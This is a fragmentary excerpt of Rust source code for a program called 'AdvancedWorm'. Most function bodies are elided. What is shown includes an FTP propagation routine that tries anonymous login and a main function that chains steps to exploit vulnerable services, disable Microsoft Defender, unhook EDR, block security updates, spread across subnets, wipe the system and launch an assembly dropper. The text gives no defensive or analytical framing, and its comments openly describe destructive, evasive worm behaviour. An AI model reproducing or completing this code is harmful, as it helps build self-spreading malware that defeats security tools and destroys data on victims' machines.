...
impl AdvancedWorm {
    ...
    fn propagate_via_ftp(&self, target: &str, worm_executable: &str) -> Result<(), WormError> {
        ...
        // Try anonymous login
        if let Err(e) = ftp.login("anonymous", "") {
...
fn main() -> Result<(), WormError> {
    ...
    let _ = worm.exploit();                  // Aggressively exploit vulnerable services
    let _ = worm.disable_defender(Some(vec![]));   // Disable Microsoft Defender processes and services
    let _ = worm.unhook_edr();               // Unhook EDR services
    let _ = worm.block_security_updates();   // Prevent further updates from happening
    let _ = worm.self_propagate();           // Network-based spreading across subnets
    worm.detect_threats();           // Call without ? if it doesn't return Result
    let _ = worm.wipe_system();     // Wipe system after operations are complete
    worm.create_dropper()?;          // create an ASM dropper and execute it
    Ok(())
}                                                                          